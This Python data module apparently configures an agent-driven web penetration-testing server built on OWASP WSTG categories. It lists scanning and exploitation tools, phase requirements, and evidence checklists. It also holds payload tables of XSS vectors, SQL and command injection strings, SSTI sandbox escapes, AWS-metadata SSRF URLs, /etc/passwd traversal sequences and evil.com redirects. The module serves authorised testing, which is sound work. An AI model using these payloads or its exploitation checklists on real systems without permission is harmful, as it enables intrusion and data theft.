"""Static data used by the Dristi MCP server.

Extracted from server.py to reduce the monolithic file size.
Contains WSTG payloads, evidence checklists, phase configs, etc.
"""

from typing import Any

# ── WSTG Category Registry ──────────────────────────────────────────
CATEGORIES: dict[str, dict[str, str]] = {
    "01": {"code": "INFO", "name": "Information Gathering", "dir": "01-information-gathering"},
    "02": {"code": "CONF", "name": "Configuration and Deployment Management", "dir": "02-configuration"},
    "03": {"code": "IDNT", "name": "Identity Management", "dir": "03-identity-management"},
    "04": {"code": "ATHN", "name": "Authentication", "dir": "04-authentication"},
    "05": {"code": "ATHZ", "name": "Authorization", "dir": "05-authorization"},
    "06": {"code": "SESS", "name": "Session Management", "dir": "06-session-management"},
    "07": {"code": "INPV", "name": "Input Validation", "dir": "07-input-validation"},
    "08": {"code": "ERRH", "name": "Error Handling", "dir": "08-error-handling"},
    "09": {"code": "CRYP", "name": "Cryptography", "dir": "09-cryptography"},
    "10": {"code": "BUSL", "name": "Business Logic", "dir": "10-business-logic"},
    "11": {"code": "CLNT", "name": "Client-Side", "dir": "11-client-side"},
    "12": {"code": "APIT", "name": "API Testing", "dir": "12-api-testing"},
}

_CODE_TO_NUM = {cat["code"]: num for num, cat in CATEGORIES.items()}

# ── CLI Tool Registry ───────────────────────────────────────────────
TOOL_REGISTRY: dict[str, dict[str, Any]] = {
    "nmap": {"phase": 0, "tier": "mandatory", "condition": None},
    "katana": {"phase": 0, "tier": "mandatory", "condition": None},
    "ffuf": {"phase": 0, "tier": "mandatory", "condition": None},
    "httpx": {"phase": 0, "tier": "mandatory", "condition": None},
    "whatweb": {"phase": 0, "tier": "mandatory", "condition": None},
    "gau": {"phase": 0, "tier": "mandatory", "condition": None},
    "nikto": {"phase": 0, "tier": "mandatory", "condition": None},
    "feroxbuster": {"phase": 0, "tier": "mandatory", "condition": None},
    "wapiti": {"phase": 0, "tier": "mandatory", "condition": None},
    "subfinder": {"phase": 0, "tier": "conditional", "condition": "scope includes subdomains"},
    "arjun": {"phase": 0, "tier": "conditional", "condition": "hidden parameter discovery needed"},
    "corscanner": {"phase": 2, "tier": "mandatory", "condition": None},
    "dnsreaper": {"phase": 2, "tier": "conditional", "condition": "subdomains discovered"},
    "hydra": {"phase": 3, "tier": "conditional", "condition": "login form exists"},
    "jwt_tool": {"phase": 3, "tier": "conditional", "condition": "JWT tokens detected"},
    "sqlmap": {"phase": 4, "tier": "mandatory", "condition": "endpoints with input params"},
    "dalfox": {"phase": 4, "tier": "mandatory", "condition": "endpoints with input params"},
    "commix": {"phase": 4, "tier": "mandatory", "condition": "endpoints with input params"},
    "sstimap": {"phase": 4, "tier": "mandatory", "condition": "endpoints with reflected input"},
    "ssrfmap": {"phase": 4, "tier": "conditional", "condition": "endpoints with URL params"},
    "nosqli": {"phase": 4, "tier": "conditional", "condition": "NoSQL database detected"},
    "crlfuzz": {"phase": 4, "tier": "mandatory", "condition": None},
    "smuggler": {"phase": 4, "tier": "mandatory", "condition": None},
    "testssl.sh": {"phase": 5, "tier": "mandatory", "condition": "HTTPS target"},
    "graphql-cop": {"phase": 5, "tier": "conditional", "condition": "GraphQL endpoint found"},
    "websocat": {"phase": 5, "tier": "conditional", "condition": "WebSocket endpoint found"},
}

# ── Exhaustion Thresholds ───────────────────────────────────────────
EXHAUSTION_THRESHOLDS = {
    "xss": {"min_techniques": 3, "min_bypass_attempts": 5, "description": "3+ payload types (reflected/stored/DOM), 5+ WAF/filter bypass variants"},
    "sqli": {"min_techniques": 3, "min_bypass_attempts": 5, "description": "3+ techniques (error/boolean/time/UNION), 5+ encoding/bypass variants"},
    "cmdi": {"min_techniques": 3, "min_bypass_attempts": 5, "description": "3+ separator types (;|`$()&&), 5+ filter bypass variants"},
    "ssti": {"min_techniques": 2, "min_bypass_attempts": 3, "description": "2+ template engine syntaxes, 3+ sandbox escape attempts"},
    "ssrf": {"min_techniques": 3, "min_bypass_attempts": 5, "description": "3+ URL schemes/encodings, 5+ filter bypass variants (IP encoding, DNS rebinding)"},
    "path_traversal": {"min_techniques": 3, "min_bypass_attempts": 5, "description": "3+ traversal encodings (../, ..%2f, ....//), 5+ filter bypass variants"},
    "idor": {"min_techniques": 2, "min_bypass_attempts": 3, "description": "2+ ID manipulation types (sequential, UUID, encoded), 3+ access control bypass attempts"},
    "auth": {"min_techniques": 2, "min_bypass_attempts": 3, "description": "2+ auth bypass techniques, 3+ token manipulation attempts"},
}

# ── Context-Aware Witness Payloads ──────────────────────────────────
WITNESS_PAYLOADS = {
    "html_body": {
        "description": "User input rendered inside HTML body (between tags)",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "<img src=x onerror=alert(1)>", "purpose": "Event handler in tag", "bypass_level": "basic"},
            {"payload": "<svg onload=alert(1)>", "purpose": "SVG event handler", "bypass_level": "basic"},
            {"payload": "<details open ontoggle=alert(1)>", "purpose": "Interaction-free event", "bypass_level": "intermediate"},
            {"payload": "<math><mtext><table><mglyph><svg><mtext><textarea><path d=\"<img onerror='alert(1)' src=x>\">", "purpose": "Nested tag confusion", "bypass_level": "advanced"},
        ],
    },
    "html_attribute": {
        "description": "User input inside an HTML attribute value",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": '" onmouseover="alert(1)', "purpose": "Break attribute, add event", "bypass_level": "basic"},
            {"payload": '" onfocus="alert(1)" autofocus="', "purpose": "Auto-triggering event", "bypass_level": "basic"},
            {"payload": "' onmouseover='alert(1)", "purpose": "Single-quote attribute break", "bypass_level": "basic"},
            {"payload": '"><img src=x onerror=alert(1)>', "purpose": "Break attribute and tag", "bypass_level": "intermediate"},
        ],
    },
    "javascript_string": {
        "description": "User input inside a JavaScript string literal",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "'; alert(1); //", "purpose": "Break string, execute JS", "bypass_level": "basic"},
            {"payload": '"; alert(1); //', "purpose": "Double-quote string break", "bypass_level": "basic"},
            {"payload": "\\'; alert(1); //", "purpose": "Escaped quote bypass", "bypass_level": "intermediate"},
            {"payload": "</script><img src=x onerror=alert(1)>", "purpose": "Break script context entirely", "bypass_level": "intermediate"},
        ],
    },
    "javascript_template": {
        "description": "User input inside a JS template literal (backticks)",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "${alert(1)}", "purpose": "Template expression injection", "bypass_level": "basic"},
            {"payload": "`; alert(1); //", "purpose": "Break template literal", "bypass_level": "basic"},
        ],
    },
    "url_param": {
        "description": "User input in URL context (href, src, redirect)",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "javascript:alert(1)", "purpose": "JS protocol handler", "bypass_level": "basic"},
            {"payload": "data:text/html,<script>alert(1)</script>", "purpose": "Data URI injection", "bypass_level": "intermediate"},
            {"payload": "//evil.com", "purpose": "Protocol-relative redirect", "bypass_level": "basic"},
            {"payload": "https://evil.com", "purpose": "Open redirect", "bypass_level": "basic"},
        ],
    },
    "css_value": {
        "description": "User input inside CSS property value",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "red; background-image: url(javascript:alert(1))", "purpose": "CSS injection with JS", "bypass_level": "basic"},
            {"payload": "expression(alert(1))", "purpose": "IE CSS expression (legacy)", "bypass_level": "advanced"},
        ],
    },
    "sql_string": {
        "description": "User input in SQL string context",
        "canary": "1",
        "payloads": [
            {"payload": "' OR '1'='1'--", "purpose": "String-context boolean bypass", "bypass_level": "basic"},
            {"payload": "' UNION SELECT NULL--", "purpose": "UNION column discovery", "bypass_level": "basic"},
            {"payload": "'; WAITFOR DELAY '0:0:5'--", "purpose": "Time-based blind (MSSQL)", "bypass_level": "intermediate"},
            {"payload": "' AND SLEEP(5)--", "purpose": "Time-based blind (MySQL)", "bypass_level": "intermediate"},
            {"payload": "' AND pg_sleep(5)--", "purpose": "Time-based blind (PostgreSQL)", "bypass_level": "intermediate"},
        ],
    },
    "sql_numeric": {
        "description": "User input in SQL numeric context (no quotes)",
        "canary": "1",
        "payloads": [
            {"payload": "1 OR 1=1", "purpose": "Numeric boolean bypass", "bypass_level": "basic"},
            {"payload": "1 UNION SELECT NULL", "purpose": "UNION column discovery", "bypass_level": "basic"},
            {"payload": "1; WAITFOR DELAY '0:0:5'", "purpose": "Stacked query time-based", "bypass_level": "intermediate"},
        ],
    },
    "command_shell": {
        "description": "User input reaching OS command execution",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "; id", "purpose": "Semicolon separator", "bypass_level": "basic"},
            {"payload": "| id", "purpose": "Pipe separator", "bypass_level": "basic"},
            {"payload": "$(id)", "purpose": "Command substitution", "bypass_level": "basic"},
            {"payload": "`id`", "purpose": "Backtick substitution", "bypass_level": "basic"},
            {"payload": "|| id", "purpose": "OR separator", "bypass_level": "basic"},
            {"payload": "%0aid", "purpose": "Newline injection", "bypass_level": "intermediate"},
            {"payload": "';id;'", "purpose": "Quote-break + separator", "bypass_level": "intermediate"},
        ],
    },
    "ssti_template": {
        "description": "User input rendered in server-side template",
        "canary": "49",
        "payloads": [
            {"payload": "{{7*7}}", "purpose": "Jinja2/Twig detection", "bypass_level": "basic"},
            {"payload": "${7*7}", "purpose": "Freemarker/Mako detection", "bypass_level": "basic"},
            {"payload": "<%= 7*7 %>", "purpose": "ERB/EJS detection", "bypass_level": "basic"},
            {"payload": "#{7*7}", "purpose": "Ruby/Slim detection", "bypass_level": "basic"},
            {"payload": "{{constructor.constructor('return 1')()}}", "purpose": "Sandbox escape (Nunjucks)", "bypass_level": "advanced"},
        ],
    },
    "ssrf_url": {
        "description": "User input used as URL for server-side request",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "http://127.0.0.1", "purpose": "Localhost access", "bypass_level": "basic"},
            {"payload": "http://169.254.169.254/latest/meta-data/", "purpose": "AWS metadata", "bypass_level": "basic"},
            {"payload": "http://[::1]", "purpose": "IPv6 localhost", "bypass_level": "intermediate"},
            {"payload": "http://0x7f000001", "purpose": "Hex IP encoding", "bypass_level": "intermediate"},
            {"payload": "http://2130706433", "purpose": "Decimal IP encoding", "bypass_level": "intermediate"},
            {"payload": "http://localtest.me", "purpose": "DNS rebinding (resolves to 127.0.0.1)", "bypass_level": "advanced"},
        ],
    },
    "path_traversal": {
        "description": "User input used in file path construction",
        "canary": "CANARY12345",
        "payloads": [
            {"payload": "../../../../etc/passwd", "purpose": "Basic traversal", "bypass_level": "basic"},
            {"payload": "....//....//....//etc/passwd", "purpose": "Double-dot bypass", "bypass_level": "intermediate"},
            {"payload": "..%2f..%2f..%2fetc/passwd", "purpose": "URL-encoded traversal", "bypass_level": "intermediate"},
            {"payload": "%2e%2e%2f%2e%2e%2fetc/passwd", "purpose": "Fully encoded", "bypass_level": "intermediate"},
            {"payload": "..%252f..%252fetc/passwd", "purpose": "Double URL encoding", "bypass_level": "advanced"},
            {"payload": "....\\\\....\\\\etc\\\\passwd", "purpose": "Windows-style traversal", "bypass_level": "basic"},
        ],
    },
}

# ── Evidence Checklists ─────────────────────────────────────────────
EVIDENCE_CHECKLISTS = {
    "xss": {
        "proof_level_required": 3,
        "levels": {
            1: "Payload blocked or encoded — NOT exploited",
            2: "Payload injected but execution blocked (CSP/WAF) — POTENTIAL",
            3: "JavaScript execution confirmed (alert/console/DOM change) — EXPLOITED",
            4: "Critical impact demonstrated (session theft, unauthorized action) — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Injection context identified (HTML body / attribute / JS string / DOM sink)",
            "Rendering location documented (which page, which element)",
            "Full payload that achieves execution",
            "Proof of ACTUAL JavaScript execution (not just reflection)",
            "Impact demonstration (cookie access, DOM manipulation, or action performed)",
        ],
    },
    "sqli": {
        "proof_level_required": 3,
        "levels": {
            1: "Injection point confirmed (error message or timing difference) — POTENTIAL",
            2: "Query structure manipulated (UNION succeeds, ORDER BY confirms columns) — POTENTIAL",
            3: "Data extraction proven (actual data retrieved from DB) — EXPLOITED",
            4: "Critical data extracted (admin creds, PII, secrets) — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Proof of injection control (error or timing confirms vulnerability)",
            "Database fingerprint (type and version: MySQL/PostgreSQL/MSSQL/SQLite)",
            "Current DB user and database name",
            "Table enumeration (list of all table names)",
            "High-value data sample (column names + first 5 rows from sensitive table)",
        ],
    },
    "cmdi": {
        "proof_level_required": 3,
        "levels": {
            1: "Injection point suspected (timing difference) — POTENTIAL",
            2: "Command separator accepted (but output not visible) — POTENTIAL",
            3: "Command output retrieved (id, whoami, or file contents) — EXPLOITED",
            4: "Full shell access or critical file read — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Injection point and separator type documented",
            "Command output proof (id, whoami, or hostname)",
            "OS fingerprint from command output",
            "Sensitive file read proof (/etc/passwd or equivalent)",
            "Full request/response with working payload",
        ],
    },
    "ssti": {
        "proof_level_required": 3,
        "levels": {
            1: "Template expression evaluated ({{7*7}}=49) — POTENTIAL",
            2: "Template engine identified but sandbox blocks RCE — POTENTIAL",
            3: "Code execution or config extraction achieved — EXPLOITED",
            4: "Full RCE with OS command execution — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Template engine identified (Jinja2, Twig, Freemarker, etc.)",
            "Expression evaluation proof (math expression result)",
            "Sandbox escape technique documented",
            "Config or environment variable extraction",
            "Full request/response with working payload",
        ],
    },
    "ssrf": {
        "proof_level_required": 3,
        "levels": {
            1: "Request sent to internal URL (timing/error difference) — POTENTIAL",
            2: "Internal service response partially visible — POTENTIAL",
            3: "Internal service data extracted or metadata accessed — EXPLOITED",
            4: "Internal network pivoting or credential extraction — EXPLOITED CRITICAL",
        },
        "checklist": [
            "SSRF endpoint and parameter documented",
            "Internal URL that was successfully accessed",
            "Response content from internal service",
            "Metadata endpoint access proof (if cloud: AWS/GCP/Azure metadata)",
            "Full request/response with internal data",
        ],
    },
    "path_traversal": {
        "proof_level_required": 3,
        "levels": {
            1: "Different error messages for valid/invalid paths — POTENTIAL",
            2: "Path traversal accepted but file content not returned — POTENTIAL",
            3: "File contents retrieved (/etc/passwd or equivalent) — EXPLOITED",
            4: "Sensitive config/credential file extracted — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Vulnerable parameter and endpoint documented",
            "Traversal sequence that bypasses filters",
            "File content proof (/etc/passwd or known file)",
            "Sensitive file extraction (config, credentials, source code)",
            "Full request/response with file contents",
        ],
    },
    "idor": {
        "proof_level_required": 3,
        "levels": {
            1: "Different response for own vs other IDs — POTENTIAL",
            2: "Partial data from other user visible — POTENTIAL",
            3: "Full access to other user's data confirmed — EXPLOITED",
            4: "Modification/deletion of other user's data — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Endpoint and ID parameter documented",
            "Own user's request and response (baseline)",
            "Other user's ID used in request",
            "Other user's data in response (proving access)",
            "At least 3 different IDs tested to confirm pattern",
        ],
    },
    "auth": {
        "proof_level_required": 3,
        "levels": {
            1: "Auth weakness identified (theoretical) — POTENTIAL",
            2: "Partial auth bypass (some protected data visible) — POTENTIAL",
            3: "Full authentication bypass confirmed — EXPLOITED",
            4: "Privilege escalation to admin — EXPLOITED CRITICAL",
        },
        "checklist": [
            "Auth mechanism and bypass technique documented",
            "Request without valid credentials",
            "Response showing authenticated content",
            "Proof that protected functionality is accessible",
            "Comparison: authenticated vs bypassed response",
        ],
    },
}

# ── Slot Types for Sink Classification ──────────────────────────────
SLOT_TYPES = {
    "sql": {
        "SQL-val": {"defense": "Parameterized query / prepared statement", "wrong_defense": "String escaping"},
        "SQL-like": {"defense": "Parameterized LIKE with escaped wildcards", "wrong_defense": "Manual escaping"},
        "SQL-num": {"defense": "Type casting to integer/float", "wrong_defense": "String validation only"},
        "SQL-enum": {"defense": "Strict whitelist of allowed values", "wrong_defense": "Regex validation"},
        "SQL-ident": {"defense": "Identifier whitelist (NOT parameterization)", "wrong_defense": "Parameterized query (wrong for identifiers)"},
        "SQL-order": {"defense": "Whitelist of column names", "wrong_defense": "User input in ORDER BY"},
    },
    "command": {
        "CMD-argument": {"defense": "Array-based execution (shell=False)", "wrong_defense": "String escaping"},
        "CMD-part-of-string": {"defense": "AVOID — redesign to use array args", "wrong_defense": "shlex.quote (insufficient for all cases)"},
    },
    "file": {
        "FILE-path": {"defense": "resolve() + startswith(base_dir) boundary check", "wrong_defense": "Regex stripping of ../"},
        "FILE-include": {"defense": "Strict path whitelist", "wrong_defense": "Prefix check without canonicalization"},
    },
    "html": {
        "HTML-body": {"defense": "HTML entity encoding (&lt; &gt; &amp;)", "wrong_defense": "Strip tags only"},
        "HTML-attr": {"defense": "Attribute encoding + quote wrapping", "wrong_defense": "HTML entity encoding (wrong context)"},
        "HTML-js": {"defense": "JavaScript string escaping + CSP", "wrong_defense": "HTML encoding (wrong context)"},
        "HTML-url": {"defense": "URL scheme whitelist (http/https only)", "wrong_defense": "URL encoding only"},
        "HTML-css": {"defense": "CSS value whitelist", "wrong_defense": "Strip parentheses"},
    },
    "redirect": {
        "REDIR-url": {"defense": "Destination whitelist or same-origin check", "wrong_defense": "Prefix check (//evil.com bypasses)"},
    },
    "template": {
        "TMPL-expr": {"defense": "NEVER allow user input in template expressions", "wrong_defense": "Sandbox (can be escaped)"},
        "TMPL-body": {"defense": "Autoescape enabled for context", "wrong_defense": "Manual encoding"},
    },
}

# ── Deliverable Type Registry ───────────────────────────────────────
DELIVERABLE_TYPES = {
    "endpoint_map": {"description": "Complete endpoint map from Phase 0 discovery", "consumed_by": "Phase 3-5 testing agents"},
    "test_matrix": {"description": "Per-endpoint test matrix with vulnerability classes", "consumed_by": "Phase 4 subagents"},
    "xss_analysis": {"description": "XSS vulnerability analysis results", "consumed_by": "XSS Exploitation Agent"},
    "sqli_analysis": {"description": "SQL Injection vulnerability analysis results", "consumed_by": "SQLi Exploitation Agent"},
    "cmdi_analysis": {"description": "Command Injection vulnerability analysis results", "consumed_by": "CMDi Exploitation Agent"},
    "ssrf_ssti_analysis": {"description": "SSRF and SSTI vulnerability analysis results", "consumed_by": "SSRF/SSTI Exploitation Agent"},
    "auth_analysis": {"description": "Authentication and session analysis results", "consumed_by": "Phase 4 agents for auth context"},
    "osint_analysis": {"description": "OSINT results: WHOIS, M365/Azure tenant, third-party misconfigs, spoof check, cloud bucket enumeration", "consumed_by": "Phase 4 agents for target intelligence"},
    "code_review_findings": {"description": "Source code analysis security findings", "consumed_by": "All testing agents"},
    "tool_results": {"description": "Aggregated CLI tool output and findings", "consumed_by": "Phase 4-5 agents"},
    "waf_intelligence": {"description": "WAF/defense detection results: vendor, blocked patterns, known bypasses, encoding behavior", "consumed_by": "All Phase 4 exploitation agents"},
    "xss_counterfactual_analysis": {"description": "XSS counterfactual analysis (second-pass with known vulns excluded)", "consumed_by": "XSS Exploitation Agent"},
    "sqli_counterfactual_analysis": {"description": "SQLi counterfactual analysis (second-pass)", "consumed_by": "SQLi Exploitation Agent"},
    "cmdi_counterfactual_analysis": {"description": "CMDi counterfactual analysis (second-pass)", "consumed_by": "CMDi Exploitation Agent"},
    "ssrf_ssti_counterfactual_analysis": {"description": "SSRF/SSTI counterfactual analysis (second-pass)", "consumed_by": "SSRF/SSTI Exploitation Agent"},
    "phase_0_summary": {"description": "Compressed Phase 0 context summary", "consumed_by": "Phase 1+ agents"},
    "phase_1_summary": {"description": "Compressed Phase 1 context summary", "consumed_by": "Phase 2+ agents"},
    "phase_2_summary": {"description": "Compressed Phase 2 context summary", "consumed_by": "Phase 3+ agents"},
    "phase_3_summary": {"description": "Compressed Phase 3 context summary", "consumed_by": "Phase 4+ agents"},
    "phase_4_summary": {"description": "Compressed Phase 4 context summary", "consumed_by": "Phase 5+ agents"},
    "phase_5_summary": {"description": "Compressed Phase 5 context summary", "consumed_by": "Report generation"},
    "engagement_summary": {"description": "Full engagement compressed context", "consumed_by": "Final Judge, new subagents"},
}

# ── Phase Configuration ─────────────────────────────────────────────
PHASE_NAMES = {
    0: "SCOPE — Domain Registration & Config",
    1: "RECON — Subdomain Enum, Crawl, Params, Secrets",
    2: "SURFACE — Endpoint Prioritization & Attack Surface Ranking",
    3: "HUNT — 54 @hunt-* Sub-Agent Dispatch (all WSTG vuln classes)",
    4: "CAPTURE — Evidence Collection, Screenshots, Redaction",
    5: "VALIDATE & REPORT — 7-Question Gate, Coverage Check, Report Gen",
}

PHASE_TEST_REQUIREMENTS: dict[int, dict[str, Any]] = {
    1: {
        "name": "RECON — Information Gathering",
        "must_tests": [
            "WSTG-INFO-01",
            "WSTG-INFO-02",
            "WSTG-INFO-03",
            "WSTG-INFO-04",
            "WSTG-INFO-05",
            "WSTG-INFO-06",
            "WSTG-INFO-07",
        ],
        "should_tests": ["WSTG-INFO-08", "WSTG-INFO-09", "WSTG-INFO-10"],
        "min_completed": 5,
    },
    3: {
        "name": "HUNT — All WSTG Vulnerability Classes",
        "must_tests": [
            "WSTG-CONF-01", "WSTG-CONF-02", "WSTG-CONF-03", "WSTG-CONF-04",
            "WSTG-CONF-05", "WSTG-CONF-06", "WSTG-CONF-07", "WSTG-CONF-11",
            "WSTG-CONF-12", "WSTG-CONF-13", "WSTG-CONF-14",
            "WSTG-IDNT-01", "WSTG-IDNT-02", "WSTG-IDNT-03",
            "WSTG-ATHN-01", "WSTG-ATHN-02", "WSTG-ATHN-03", "WSTG-ATHN-04",
            "WSTG-ATHN-07", "WSTG-ATHN-11",
            "WSTG-ATHZ-01", "WSTG-ATHZ-02", "WSTG-ATHZ-03", "WSTG-ATHZ-04",
            "WSTG-SESS-01", "WSTG-SESS-02", "WSTG-SESS-03", "WSTG-SESS-04",
            "WSTG-SESS-05", "WSTG-SESS-09",
            "WSTG-INPV-01", "WSTG-INPV-02", "WSTG-INPV-04", "WSTG-INPV-05",
            "WSTG-INPV-12", "WSTG-INPV-17", "WSTG-INPV-18", "WSTG-INPV-19",
            "WSTG-ERRH-01", "WSTG-ERRH-02",
            "WSTG-CRYP-01",
            "WSTG-BUSL-01", "WSTG-BUSL-02", "WSTG-BUSL-06",
            "WSTG-CLNT-01", "WSTG-CLNT-02", "WSTG-CLNT-07", "WSTG-CLNT-09", "WSTG-CLNT-13",
            "WSTG-APIT-01", "WSTG-APIT-02",
        ],
        "should_tests": [
            "WSTG-CONF-08", "WSTG-CONF-09", "WSTG-CONF-10",
            "WSTG-IDNT-04", "WSTG-IDNT-05",
            "WSTG-ATHN-05", "WSTG-ATHN-06", "WSTG-ATHN-08", "WSTG-ATHN-09", "WSTG-ATHN-10",
            "WSTG-ATHZ-05",
            "WSTG-SESS-06", "WSTG-SESS-07", "WSTG-SESS-08", "WSTG-SESS-10", "WSTG-SESS-11",
            "WSTG-INPV-03", "WSTG-INPV-06", "WSTG-INPV-07", "WSTG-INPV-08",
            "WSTG-INPV-09", "WSTG-INPV-10", "WSTG-INPV-11", "WSTG-INPV-13",
            "WSTG-INPV-14", "WSTG-INPV-15", "WSTG-INPV-16", "WSTG-INPV-20",
            "WSTG-CRYP-02", "WSTG-CRYP-03", "WSTG-CRYP-04",
            "WSTG-BUSL-03", "WSTG-BUSL-04", "WSTG-BUSL-05",
            "WSTG-BUSL-07", "WSTG-BUSL-08", "WSTG-BUSL-09", "WSTG-BUSL-10",
            "WSTG-CLNT-03", "WSTG-CLNT-04", "WSTG-CLNT-05", "WSTG-CLNT-06",
            "WSTG-CLNT-08", "WSTG-CLNT-10", "WSTG-CLNT-11", "WSTG-CLNT-12", "WSTG-CLNT-14",
            "WSTG-APIT-03",
        ],
        "min_completed": 25,
        "core_tests": ["WSTG-INPV-01", "WSTG-INPV-02", "WSTG-INPV-05", "WSTG-INPV-12", "WSTG-INPV-18", "WSTG-INPV-19"],
        "core_min": 4,
    },
    5: {
        "name": "VALIDATE & REPORT — Final Review",
        "must_tests": [],
        "should_tests": [],
        "min_completed": 0,
    },
}

PHASE_TOOL_REQUIREMENTS = {
    0: {
        "mandatory": [],
        "conditional": [],
    },
    1: {
        "mandatory": ["subfinder", "httpx", "katana", "gau"],
        "conditional": ["ffuf", "whatweb", "nikto", "nmap", "feroxbuster", "wapiti", "arjun"],
    },
    2: {"mandatory": [], "conditional": []},
    3: {
        "mandatory": ["sqlmap", "dalfox", "crlfuzz", "smuggler", "corscanner"],
        "conditional": ["commix", "sstimap", "ssrfmap", "nosqli", "hydra", "jwt_tool", "testssl.sh", "graphql-cop", "websocat", "dnsreaper"],
    },
    4: {"mandatory": [], "conditional": []},
    5: {"mandatory": [], "conditional": []},
}
